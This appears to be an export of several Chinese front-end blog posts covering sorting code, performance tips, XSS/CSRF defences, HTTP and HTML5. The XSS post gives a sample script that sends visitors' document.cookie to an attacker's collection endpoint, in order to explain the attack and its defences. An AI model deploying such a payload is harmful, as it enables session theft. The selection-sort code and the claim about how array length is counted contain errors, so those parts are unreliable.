    <content type="text"><![CDATA[这是我“八大排序三大查找JavaScript实现”系列文章的第一篇，转载请注明来源。所有排序算法针对顺序存储结构，以升序方式排列；三大查找算法不涉及动态查找（查找树与平衡查找树等）的知识。文章算法仅供参考复习数据结构与算法之用，实际工程推荐使用使用Array.prototype.sort()函数和Array.prototype.indexOf()函数 冒泡排序空间复杂度 时间复杂度 稳定性 时间复杂度：O(n^2) 空间复杂度：O(1) 稳定性：稳定 算法描述依次比较两个元素，如果他们的顺序错误就把他们交换过来。重复地进行走访数列的工作直到没有元素再需要交换。 算法实现12345678910111213141516function bubble_sort (array) &#123; var temp; for (var i = 0;i &lt; array.length;i++) &#123; for (var j = 0;j &lt; array.length - 1 - i;j++) &#123; if (array[j] &gt; array[j+1]) &#123; temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; &#125; &#125; &#125;&#125;arr = [6, 5, 7, 2, 4, 3, 0, 9, 1, 8];bubble_sort(arr);console.log(arr); //[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 改进冒泡排序123456789101112131415161718function bubble_sort (array) &#123; var temp,flag = true; //引入flag for (var i = 0;i &lt; array.length &amp;&amp; flag;i++) &#123; //判断条件加上flag flag = false; for (var j = 0;j &lt; array.length - 1 - i;j++) &#123; if (array[j] &gt; array[j+1]) &#123; flag = true; //如果排序有错误，证明还有可能没有完全排序成功 temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; &#125; &#125; &#125;&#125;arr = [6, 5, 7, 2, 4, 3, 0, 9, 1, 8];bubble_sort(arr);console.log(arr); //[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 为什么在这种情况下说冒泡排序算法被改进了?因为“某一次循环时所有的元素位置都正确”等价于“排序完成”。 简单选择排序空间复杂度 时间复杂度 稳定性 时间复杂度：O(n^2) 空间复杂度：O(1) 稳定性：不稳定 算法描述每次都找到当次最大的数，按大小顺序依次放入数组相应位置。 简单选择排序算法实现12345678910111213141516171819function selection_sort (array) &#123; for (var i = 0 ; i &lt; array.length - 1 ; i++) &#123; var min = i,temp; for (var j = i + 1; j &lt; array.length; j++) &#123; if (arr[j] &lt; arr[min]) &#123; min = j; &#125; &#125; if (min !== i) &#123; temp = array[i]; array[i] = array[min]; array[min] = temp; &#125; &#125;&#125;arr = [6, 5, 7, 2, 4, 3, 0, 9, 1, 8];selection_sort(arr);console.log(arr); //[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 插入排序空间复杂度 时间复杂度 稳定性 时间复杂度：O(n^2) 空间复杂度：O(1) 稳定性：稳定 算法描述通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入（直接插入排序）。或对于未排序数据，在已排序序列中以二分查找法扫描，找到相应位置并插入（二分插入排序）。 直接插入排序算法实现1234567891011121314function insertion_sort (array) &#123; var temp; for (var i = 1; i &lt; array.length; i++) &#123; temp = array[i]; for (var j = i; j &gt; 0 &amp;&amp; array[j-1] &gt; temp; j--) &#123; array[j] = array[j-1]; &#125; array[j] = temp; &#125;&#125;arr = [6, 5, 7, 2, 4, 3, 0, 9, 1, 8];insertion_sort(arr);console.log(arr); //[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 二分查找插入排序123456789101112131415161718192021function insertion_sort (array) &#123; for (var i = 0;i &lt; array.length;i++) &#123; var start = 0, end = i - 1, middle = 0, temp = array[i]; while (start &lt;= end) &#123; middle = Math.floor((start + end) / 2); if (array[middle] &gt; temp) &#123; end = middle - 1; &#125; else &#123; start = middle + 1; &#125; &#125; for (var j = i - 1; j &gt; end; j--) &#123; array[j + 1] = array[j]; &#125; array[end + 1] = temp; &#125;&#125; arr = [6, 5, 7, 2, 4, 3, 0, 9, 1, 8];insertion_sort(arr);console.log(arr); //[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端性能优化]]></title>
    <url>%2Fblog%2F2017%2F11%2F28%2F%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[前端性能优化设计很多方面，今天准备写一篇文章做一个纵览的总结。文章会从 程序性能优化 资源分配优化 传输性能优化 用户体验优化四个大的角度来解析前端性能优化。 程序性能优化当代前端有两大驱动的开发模式，分别是以DOM为驱动的传统开发模式和以数据为驱动的MVVM开发模式;这两种开发模式分别面临着各自的性能优化问题，除了针对这两种开发模式的性能优化之外还有一些编程细节的性能优化方法。 以DOM为驱动的性能优化：减少或合并DOM操作众所周知，DOM操作是前端程序中最耗费资源的编程操作。示例代码如下：12345678910111213// 不好的方式//var elem = $('#elem');//for (var i = 0; i &lt; 100; i++) &#123;// elem.append('&lt;li&gt;element '+i+'&lt;/li&gt;');//&#125;// 好的方式var elem = $('#elem' ),arr = [];for (var i = 0; i &lt; 100; i++) &#123; arr.push('&lt;li&gt;element ' +i+'&lt;/li&gt;' );&#125;elem.append(arr. join(''));事实上，最新的MVVM框架纷纷对自家的文档操作中实现了虚拟DOM，通过Diff算法来减少真实DOM操作的压力。 以数据为驱动的性能优化：优化数据结构前端MVVM框架以数据为驱动进行开发，则需要对问题抽象出合适的逻辑结构，选择合适的数据结构，再通过高效的算法实现。比如在实际项目中尽量不要使用以前算法课上学的“冒泡排序 选择排序”，而使用Array.prototype.sort()方法，以V8引擎为例，不严谨的说，它的算法跟数组的长度有关，当数组长度小于等于 10 时，采用插入排序，大于 10 的时候，采用快速排序。时间复杂度在最好的情况下可以达到O(n). 其他一些细节：对大量重复事件使用事件代理 对大量数据计算使用缓存 减少无必要的大量触发事件操作等如一篇我以前文章事件中所提到的事件代理机制，绑定一个元素使用事件代理比绑定100个小事件更加节约性能。又有如下例子：12345678// data.length === 100000for(var i = 0;i &lt; data.length;i++)&#123; // do something...&#125;//上面的代码没有下面的好for(var i = 0,len = data.length;i &lt; len;i++)&#123; // do something...&#125;因为data.length在源代码中是通过.next()方法一个一个数出来的，所以可以把它赋值给一个缓存len,以后每次重复需要这个量的时候只需要调用缓存就行了。还有一些情况，常见于触发滚动事件时，滚动事件每滚动一个像素就会触发一次，为了防止它过于频繁的触发，常常使用setTimeout()方法来降低它调用的频率，每隔一定时间段才触发。 资源分配优化上海交通大学杨斌老师的《软件工程》课程指出，现代软件发展瓶颈之一在于网络传输速度的瓶颈。这也就意味着在我们设计前端工程的时候要考虑如何根据线性的网络传输速度平均分配资源的展现量来缓解用户的焦虑————事实上这样做如果加载的是动态资源还有助于缓解服务器压力，从未来的角度思考，甚至可能帮助缓解客户端内存和磁盘读写压力。 分页 懒加载使用分页和懒加载的方法在这里不再赘述了，谷歌一下能够得到一大堆的实现方法。这里主要提示三个点： 分页和懒加载的单页数据数量要选择适合，满足一个节拍的浏览体验，太短让人感觉没刷两页就加载，影响心流；太多则导致加载时间问题。 对于懒加载，选择合适的占位元素是关键。因为不选择占位元素，往往会导致文档结构展示没有预期设计稿的架构，如果CSS编写者功力不够，甚至会产生整个文档的错位。 对于分页，要确认是前端处理分页还是后端处理分页。这往往根据团队规划，服务器处理能力而定。事实上很多问题的处理都应该思考这两点。 单页应用基于路由的懒加载以Vue为例，有12// import Foo from './Foo.vue'const Foo = resolve =&gt; require(['./Foo.vue'], resolve)因为webpack的流行，很容易以Promise的形式实现基于路由的懒加载和自动的封装打包。 预加载所谓“预加载”仅仅是一种思路，有多种实践方法，往往用于图片音乐视频等大的静态资源上。小到在曝光加载时将加载时间略提前于曝光，大到WebApp先加载后运行，都可以称之为“预加载”。 传输性能优化前端工程的最典型特征在于他是异步的，互联网化的，所以针对‘传输’这一关键点进行优化往往是最直接，最有效的方法。 选择合适的通信协议在需要服务器主动发布信息的情况下，尽量使用Websocket而不是Ajax轮询。往往能获得更加的用户通信体验和性能。 压缩合并资源：减小请求内容大小和请求数最直观的，静态资源的大小和多少直接制约了加载的速度，对静态资源的压缩合并打包也显得必要起来。 早期的前端常常是切图仔在线手动压缩合并js，css，用图片处理软件手动降低图片质量，例如像在下面的网址：在线 JS/CSS/HTML 压缩再后来，前端工程化思想成型，人们开始使用gulp之类的前端工作流处理工具进行压缩合并处理：gulp使用：进行压缩合并js、css到了现在，我们最常用的往往是Webpack来进行模块打包，合并压缩。不仅如此，Webpack甚至可以实现分块打包，按需加载，代码热修改等高级功能：基于webpack的前端工程化开发解决方案探索 使用CDN传输静态资源 CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。————百度百科 及时使用CDN可以有效的减少静态资源加载速度。当然，动态资源是严禁CDN的，当然，CDN还有其他的一些妙用：比如Github禁止百度爬虫爬取GithubPages的内容，这个时候可以选择把自己GithubPages上的内容分发到CDN上，这样就可以正确的爬取CDN上的资源然后定向到你的页面了。 启用服务器压缩方案：gzip等流行的服务器往往都配备了gzip压缩方案，开启它往往不超过几行配置，却可以降低三分之二的流量消耗。 采用合适的缓存方案不经常更新的内容尽量定义长时间的缓存时间，不但能减少服务器的压力，还可以优化用户的体验。即使是更新频繁的资源也尽量使用Etag头的方法进行缓存更新来让服务器资源获得有效利用。 用户体验优化通过良好的设计虽然不能直接提高软件性能，但是可以有效的缓解用户焦虑，提高即时数据利用率等。 采用进度条等手段解决“无响应错觉”进度条最初的设计是用来提醒操作者“我们在进行一些后台的操作，并不是死机了”，直到现在这一经典设计仍旧被沿用。不确定的等待时间比已知的、有限的等待时间让人觉得更长。在一些情况下，并不适用动画加载，如加载H5，上传文件，人们会因无法预知加载时间长短而感到烦躁。你应该给你的用户一个清晰地等待时间,让用户盯着一个下载进度条会让跳出率降低。 采用提前展现内容等方法即使内容不能点击，也把获得的信息先呈现给用户之后再加载内容或点击事件，这样的操作增加了信息流在时间线性程度上的价值。 优秀的交互设计我个人最喜欢的交互设计框架当属蚂蚁金服的Antd，下面提供一个链接以飱各位Antd设计语言 综合优化策略————优先补充短板一只木桶能盛多少水，并不取决于最长的那块木板，而是取决于最短的那块木板。也可称为短板效应。任何一个前端架构，可能面临的一个共同问题，即构成工程的各个部分往往是优劣不齐的，而劣势部分往往决定整个工程的水平。因此，每个人都应思考一下“短板”的位置，并尽早补足它。 附：前端性能测试工具网站WebPageTest谷歌的性能测试网站]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端安全：XSS与CSRF]]></title>
    <url>%2Fblog%2F2017%2F11%2F27%2F%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%EF%BC%9AXSS%E4%B8%8ECSRF%2F</url>
    <content type="text"><![CDATA[XSS的原理和防范方式XSS全称Cross Site Scripting（为啥不叫CSS？为了和层叠样式表Cascading Style Sheets区分），即跨站脚本攻击。定义 恶意用户 是实行XSS攻击的人，恶意代码 是指含有某些可执行恶意前端脚本的代码，目标用户 是指受到XSS攻击的人。恶意用户将恶意脚本装作普通文本的样式上传到服务器，这些文本将被渲染到目标用户的页面上，从而被执行，这样的流程称之为‘跨站脚本攻击’。举例：有一个发表评论的功能，一个人发表了评论大家就都能看见，于是恶意用户就在这个评论区发表了以下代码：1234var request = new XMLHttpRequest();request.open('POST', '/攻击者自家的收集数据的接口', true);request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');request.send(document.cookie);如果这个代码未经过滤直接执行，那么攻击者将会收集所有访问这个评论区的用户的cookie以便执行只有目标用户才有权限做的事情。作为网站建设方，我们通常可以采取以下手段来防止XSS攻击： 转义 &lt; &gt; 这些特殊字符为实体字符 利用正则判断攻击脚本 尽量修改节点文本而不是修改节点内容html 事实上，现代模板引擎和MVVM框架往往都自带防御XSS攻击的模板写法。例如在ng2、Vue和handlebars.js里，双花括号表示自动过滤，三花括号才表示不经转义直接输出。 CSRF的原理和防范方式CSRF全称Cross-site request forgery（跨站请求伪造）是指恶意用户将某些需要他人权限的接口埋藏在自己的脚本中，将脚本利用XSS相同的注入方式或诱导用户点击执行等方式令拥有权限者执行，从而达到自己的目的。例如，恶意用户想要给某个人刷票，而一个微信号只能投一张票，他发现了刷票的接口为A，则将对A进行Ajax请求的XSS脚本注入某网站（方法1）,或者利用像色情等吸引眼球的方法（方法2）将此段脚本内嵌入自己写的网页中诱使他人点击，从而实现不断有有效用户访问这个接口的目的。作为网站建设方，我们通常可以使用以下手段来防止CSRF攻击： 尽量对要修改数据的请求使用post而不是get 给每一次用户登陆分配一个临时token，用服务端的setCookie头将此token种入用户cookie中，每次请求比对用户方token与服务器端token是否吻合。 服务器禁止跨域请求 及时清除用户的无效cookie]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[http]]></title>
    <url>%2Fblog%2F2017%2F11%2F23%2Fhttp%2F</url>
    <content type="text"><![CDATA[OSI 七层模型指什么OSI是ISO制定的一个用于标准化计算机或通信系统间互联的标准体系。从底层到高层分别为 层级名称 英文名称 应用举例 描述 物理层 Physical Layer 网卡，网线，交换机等 建立、维护、断开物理连接 数据链路层 Link 建立逻辑连接、进行硬件地址寻址、差错校验等功能 将比特组合成字节进而组合成帧，用MAC地址访问介质，错误发现但不能纠正 网络层 Network ICMP IGMP IP（IPV4 IPV6） ARP RARP 进行逻辑地址寻址，实现不同网络之间的路径选择 传输层 Transport TCP UDP 定义传输数据的协议端口号，以及流控和差错校验，数据包一旦离开网卡即进入网络传输层 会话层 Session Layer 对应主机进程，指本地主机与远程主机正在进行的会话 建立、管理、终止会话 表示层 Presentation Layer JPEG、ASCll、DECOIC、加密格式 数据的表示、安全、压缩（在五层模型里面已经合并到了应用层） 应用层 Application HTTP FTP TFTP SMTP SNMP DNS TELNET HTTPS POP3 DHCP 网络服务与最终用户的一个接口 将会话层和表示层、应用层合并为一层，称之为“五层模型”。在五层模型的基础上将物理层和数据链路层合并为一层，称之为“四层模型” HTTP 的工作原理是什么？HTTP由请求和响应构成，是一个标准的客户端服务器模型（B/S）。HTTP协议永远都是客户端发起请求，服务器回送响应。一次HTTP操作称为一个事务，其工作整个过程如下： 地址解析用客户端浏览器从URL中分解出协议名、主机名、端口、对象路径等部分，需要域名系统DNS解析域名localhost.com,得主机的IP地址。 封装HTTP请求数据包把以上部分结合本机自己的信息，封装成一个HTTP请求数据包 封装成TCP包，建立TCP连接（TCP的三次握手）在HTTP工作开始之前，客户机（Web浏览器）首先要通过网络与服务器建立连接，HTTP是比TCP更高层次的应用层协议，根据规则，只有低层协议建立之后才能，才能进行更层协议的连接，因此，首先要建立TCP连接。 客户机发送请求命令建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可选内容。 服务器响应服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。实体消息是服务器向浏览器发送头信息后，它会发送一个空白行来表示头信息的发送到此为结束，接着，它就以Content-Type应答头信息所描述的格式发送用户所请求的实际数据 服务器关闭TCP连接（TCP的四次挥手）一般情况下，一旦Web服务器向浏览器发送了请求数据，它就要关闭TCP连接，然后如果浏览器或者服务器在其头信息加入了这行代码 Connection:keep-alive TCP连接在发送后将仍然保持打开状态，于是，浏览器可以继续通过相同的连接发送请求。保持连接节省了为每个请求建立新连接所需的时间，还节约了网络带宽。 (附：HTTPS加密原理) URI 的格式是什么？常见的协议有哪些URI是采用一种特定语法标识一个资源的字符串，称之为“统一资源标识符” 格式：协议//用户名:密码@授权机构:端口号/路径?查询字符串#哈希例如： ftp://mp3:mp3@ci43198-a.ashvill.nc.home.com:33/VanHalen-Jump.mp3所有其他字符及内容中需用到的定界符也应用%转义（空格%20 /%2F） 常见的协议： 协议 描述 data 链接中直接包含的Base64编码数据 file 本地磁盘的文件 ftp FTP服务器 http 使用超文本传输协议的国际互联网服务器 mailto 电子邮件地址 magnet 可以通过对等网络下载的资源 telnet 与基于Telnet的服务连接 HTTP 协议有几种和服务器交互的方法以HTTP 1.1标准，有如下几种方法： GET：获取资源GET方法用来请求访问已被URL识别的资源 POST：传输实体主体POST方法用来请求服务器传输信息实体的主体 PUT：传输文件PUT要求在请求报文的主体中包含文件内容，然后保存到请求URL指定的位置处于安全考虑，一般web网站不使用此方法，若配合web的安全验证机制，或者架构采用REST标准的网站，就可能开放使用此方法 HEAD：获得报文首部HEAD和GET方法一样，只不过不返回报文主体部分，用于确认URI的有效性及资源更新的日期时间等 DELETE：删除文件DELETE是与PUT相反的方法，是按请求URI删除指定的资源处于安全考虑，一般web网站不使用此方法，若配合web的安全验证机制，或者架构采用REST标准的网站，就可能开放使用此方法 OPYIONS：询问支持的方法用来查询针对请求URI指定的资源支持的方法 TRACE：追踪路径是让web服务器端将之前的请求通信还回给客户端的方法发送请求时，在Max-Frowards首部字段中填入数值，每经过一个服务器端就-1，当数值为0时，停止传输，最后收到服务器返回状态码200 OK的响应但是，这种方法基本很少使用，而且很容易引起XST（跨站追踪）攻击，就更不会用到了。 CONNECT：要求采用隧道协议连接代理该方法要求在于代理服务器通信时建立隧道，实现用隧道协议进行TCP通信，主要使用SSL（安全套接层）和TLS（传输层安全）协议把通信内容加密后经过网络传输。 状态码200，301，304，403,404,500，503分别代表什么意思 200 OK请求已成功，请求所希望的响应头或数据体将随此响应返回。出现此状态码是表示正常状态。 301 Moved Permanently被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。新的永久性的URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。注意：对于某些使用 HTTP/1.0 协议的浏览器，当它们发送的 POST 请求得到了一个301响应的话，接下来的重定向请求将会变成 GET 方式。 304 Not Modified如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。该响应必须包含以下的头信息：Date，除非这个服务器没有时钟。假如没有时钟的服务器也遵守这些规则，那么代理服务器以及客户端可以自行将 Date 字段添加到接收到的响应头中去（正如RFC 2068中规定的一样），缓存机制将会正常工作。ETag 和/或 Content-Location，假如同样的请求本应返回200响应。Expires, Cache-Control，和/或Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。假如本响应请求使用了强缓存验证，那么本次响应不应该包含其他实体头；否则（例如，某个带条件的 GET 请求使用了弱缓存验证），本次响应禁止包含其他实体头；这避免了缓存了的实体内容和更新了的实体头信息之间的不一致。假如某个304响应指明了当前某个实体没有缓存，那么缓存系统必须忽视这个响应，并且重复发送不包含限制条件的请求。假如接收到一个要求更新某个缓存条目的304响应，那么缓存系统必须更新整个条目以反映所有在响应中被更新的字段的值。 403 Forbidden服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。 404 Not Found请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。出现这个错误的最有可能的原因是服务器端没有这个页面。 500 Internal Server Error服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。一般来说，这个问题都会在服务器端的源代码出现错误时出现。 503 Service Unavailable由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是临时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个 Retry-After 头用以标明这个延迟时间。如果没有给出这个 Retry-After 信息，那么客户端应当以处理500响应的方式处理它。注意：503状态码的存在并不意味着服务器在过载的时候必须使用它。某些服务器只不过是希望拒绝客户端的连接。 报文有哪几部分组成？如图所示，由请求行，头部，空行，内容四部分组成 请求头 首部 主体的的格式和作用如图所示，为一个完整的请求报文。格式已经在上题中写明，下面列出作用。 HTTP请求头规定了请求的方法，地址，协议版本，本例中使用POST方法请求http://host_name/path地址，协议版本为HTTP1.1。 HTTP首部规定了一个请求的约束和规则，以键值对的形式呈现。本例中的头部键值对分别表达了以下意思： Host: host_name 访问的宿主服务器是host_name Content-Type: text/xml 定义文件接收类型为text/xml格式接收 Content-Length: 18 消息实体的传输长度，压缩后的message-body的长度为18字节 If-Modified-Since: Sat, 02 May 2015 16:17:00 GMT 浏览器最后修改页面缓存的时间，可以让服务器与自己的数据更改时间进行比较 If-None-Match: “03fb33c0bfcc” If-None-Match和ETag一起工作，工作原理是在HTTP Response中添加ETag信息。 当用户再次请求该资源时，将在HTTP Request 中加入If-None-Match信息(ETag的值)。如果服务器验证资源的ETag没有改变（该资源没有更新），将返回一个304状态告诉客户端使用本地缓存文件。否则将返回200状态和新的资源和Etag. 使用这样的机制将提高网站的性能 Pragma: Public 指定了缓存的规则，本例子中的参数Public意味着可以被任何缓存所缓存 Accept: text/html 浏览器端可以接受的媒体类型，本例中指定为html文档 Accept-Encoding: gzip 指定了代码传输的压缩方式，本例中指定了gzip压缩方式 请求主体的内容由传输者定义，传递了客户端到服务器的内容，其格式可以任意指定。本例中传递了两个键值对。简述浏览器缓存是如何控制的当浏览器第一次访问服务器请求资源时，服务器会返回资源本体和两条缓存信息（缓存信息以http请求首部的形式定义），分别为Cache-Control和Etag。其中Cache-Control定义了何时缓存过期和缓存的各种存储细节，而Etag则是这个资源的一个特征标识符，只有当资源改变时这个标识符才会改变。当浏览器在此需要这个资源时，先通过检测这个资源的Cache-Control是否已经过期来判断是否需要向服务器发起请求再次索取这个资源，如果没有过期则直接使用缓存资源，如果过期了就连同资源的Etag一起向服务器发送请求索取资源。服务器接收到再次索取资源的请求，比对云端的Etag与请求的Etag是否相等，如果相等，则返回一个304，如果不等，则将新的资源发送给客户端。下图各个参数是什么意思用PUT方法请求Request URL地址，请求正常故状态码为200 OK，请求的远程地址（实际IP和端口）是Remote Address。请求TCP链接不要断开，消息实体的传输长度为12个字节，服务器回应的数据格式为json，时间为Date，服务器采用的软件为ngix，框架是Express。客户端请求的数据为任何格式，接受gzip，deflate，sdch编码压缩，只接受中文，对中文的喜好程度是0.8，传输的消息实体的长度为56个字节，传输主体类型为Content-Type，并且设置了cookie，传输的主机和来源站点是note.ruoyu.site，从note.ruoyu.site链接过来，有一些用户信息，传递信息的方式是Ajax。传递的消息主题有一些键值对，其中一个就是article: 若愚@饥人谷]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html5_CSS3]]></title>
    <url>%2Fblog%2F2017%2F11%2F20%2Fhtml5-CSS3%2F</url>
    <content type="text"><![CDATA[HTML5是什么？有哪些新特性？有哪些新增标签？如何让低版本的 IE 支持 HTML5新标签 HTML5是HTML最新的修订版本，2014年10月由万维网联盟（W3C）完成标准制定。目标是取代1999年所制定的HTML 4.01和XHTML 1.0标准，以期能在互联网应用迅速发展的时候，使网络标准达到匹配当代的网络需求。广义论及HTML5时，实际指的是包括HTML、CSS和JavaScript在内的一套技术组合。它希望能够减少网页浏览器对于需要插件的丰富性网络应用服务（Plug-in-Based Rich Internet Application，RIA），例如：AdobeFlash、Microsoft Silverlight与Oracle JavaFX的需求，并且提供更多能有效加强网络应用的标准集。——————Wikipedia HTML5 中的一些有趣的新特性： 用于绘画的 canvas 元素 用于媒介回放的 video 和 audio 元素 对本地离线存储的更好的支持 新的特殊内容元素，比如 article、footer、header、nav、section 新的表单控件，比如 calendar、date、time、email、url、search 单就html而言，新增标签有： html5标签 标签含义 完整标签 html4.01实现 &lt;article&gt; 外部的内容。比如来自一个外部的新闻提供者的一篇新的文章，或者来自 blog 的文本，或者是来自论坛的文本。亦或是来自其他外部源内容。 &lt;article&gt;&lt;/article&gt; &lt;div class=’article’&gt;&lt;/div&gt; &lt;aside&gt; article 以外的内容。aside 的内容应该与 article 的内容相关。 &lt;aside&gt;Aside 的内容是独立的内容，但应与文档内容相关。&lt;/aside&gt; &lt;div&gt;Aside 的内容是独立的内容，但应与文档内容相关。&lt;/div&gt; &lt;audio&gt; 声音，比如音乐或其他音频流。 &lt;audio src=”someaudio.wav”&gt;您的浏览器不支持 audio 标签。&lt;/audio&gt; &lt;object type=”application/ogg” data=”someaudio.wav”&gt;&lt;param name=”src” value=”someaudio.wav”&gt;&lt;/object&gt; &lt;canvas&gt; 图形，比如图表和其他图像。这个 HTML 元素是为了客户端矢量图形而设计的。它自己没有行为，但却把一个绘图 API 展现给客户端 JavaScript 以使脚本能够把想绘制的东西都绘制到一块画布上。 &lt;canvas id=”myCanvas” width=”200” height=”200”&gt;&lt;/canvas&gt; &lt;object data=”inc/hdr.svg” type=”image/svg+xml” width=”200” height=”200”&gt;&lt;/object&gt; &lt;command&gt; 命令按钮，比如单选按钮、复选框或按钮。 &lt;command onclick=cut()” label=”cut”&gt; none &lt;datalist&gt; 可选数据的列表。与 input 元素配合使用，就可以制作出输入值的下拉列表。 &lt;datalist&gt;&lt;/datalist&gt; see combobox. &lt;details&gt; 元素的细节，用户可进行查看，或通过点击进行隐藏。与 &lt;legend&gt; 一起使用，来制作 detail 的标题。该标题对用户是可见的，当在其上点击时可打开或关闭 detail。 &lt;details&gt;&lt;/details&gt; &lt;dl style=”display:hidden”&gt;&lt;/dl&gt; &lt;embed&gt; 嵌入的内容，比如插件。 &lt;embed src=”horse.wav” /&gt; &lt;object data=”flash.swf” type=”application/x-shockwave-flash”&gt;&lt;/object&gt; &lt;figcaption&gt; figure 元素的标题。”figcaption” 元素应该被置于 “figure” 元素的第一个或最后一个子元素的位置。 &lt;figure&gt;&lt;figcaption&gt;PRC&lt;/figcaption&gt;&lt;/figure&gt; none &lt;figure&gt; 标签用于对元素进行组合。使用 &lt;figcaption&gt; 元素为元素组添加标题。 &lt;figure&gt;&lt;figcaption&gt;PRC&lt;/figcaption&gt;&lt;p&gt;The People’s Republic of China was born in 1949…&lt;/p&gt;&lt;/figure&gt; &lt;dl&gt;&lt;h1&gt;PRC&lt;/h1&gt;&lt;p&gt;The People’s Republic of China was born in 1949…&lt;/p&gt;&lt;/dl&gt; &lt;footer&gt; section 或 document 的页脚。典型地，它会包含创作者的姓名、文档的创作日期以及/或者联系信息。 &lt;footer&gt;&lt;/footer&gt; &lt;div&gt;&lt;/div&gt; &lt;header&gt; section 或 document 的页眉。 &lt;header&gt;&lt;/header&gt; &lt;div&gt;&lt;/div&gt; &lt;hgroup&gt; 标签用于对网页或区段（section）的标题进行组合。 &lt;hgroup&gt;&lt;/hgroup&gt; &lt;div&gt;&lt;/div&gt; &lt;keygen&gt; 生成密钥。 &lt;keygen&gt; none &lt;mark&gt; 主要用来在视觉上向用户呈现那些需要突出的文字。&lt;mark&gt;标签的一个比较典型的应用就是在搜索结果中向用户高亮显示搜索关键词。 &lt;mark&gt;&lt;/mark&gt; &lt;span&gt;&lt;/span&gt; &lt;meter&gt; 度量衡。仅用于已知最大和最小值的度量。必须定义度量的范围，既可以在元素的文本中，也可以在 min/max 属性中定义。 &lt;meter&gt;&lt;/meter&gt; none &lt;nav&gt; 导航链接的部分。 &lt;nav&gt;&lt;/nav&gt; &lt;ul&gt;&lt;/ul&gt; &lt;output&gt; 不同类型的输出，比如脚本的输出。 &lt;output&gt;&lt;/output&gt; &lt;span&gt;&lt;/span&gt; &lt;progress&gt; 标签运行中的进程。可以使用 &lt;progress&gt; 标签来显示 JavaScript 中耗费时间的函数的进程。 &lt;progress&gt;&lt;/progress&gt; none &lt;ruby&gt; ruby 注释（中文注音或字符）。 &lt;ruby&gt;漢 &lt;rt&gt;&lt;rp&gt;(&lt;/rp&gt;ㄏㄢˋ&lt;rp&gt;)&lt;/rp&gt;&lt;/rt&gt;&lt;/ruby&gt; none &lt;section&gt; 文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。 &lt;section&gt;&lt;/section&gt; &lt;div&gt;&lt;/div&gt; &lt;source&gt; 标签为媒介元素（比如 &lt;video&gt; 和 &lt;audio&gt;）定义媒介资源。 &lt;source&gt; &lt;param&gt; &lt;summary&gt; 标签包含 details 元素的标题，”details” 元素用于描述有关文档或文档片段的详细信息。”summary” 元素应该是 “details” 元素的第一个子元素。 &lt;details&gt;&lt;summary&gt;HTML 5&lt;/summary&gt;This document teaches you everything you have to learn about HTML 5.&lt;/details&gt; none &lt;time&gt; 日期或时间，或者两者。 &lt;time&gt;&lt;/time&gt; &lt;span&gt;&lt;/span&gt; &lt;video&gt; 视频，比如电影片段或其他视频流。 &lt;video src=”movie.ogg” controls=”controls”&gt;您的浏览器不支持 video 标签。&lt;/video&gt; &lt;object type=”video/ogg” data=”movie.ogv”&gt;&lt;param name=”src” value=”movie.ogv”&gt;&lt;/object&gt; 可以使用 html5shiv.js 这个库使得以前版本的浏览器支持html5. input 有哪些新增类型？ email url number range Date pickers (date, month, week, time, datetime, datetime-local) search color 浏览器本地存储中 cookie 和 localStorage 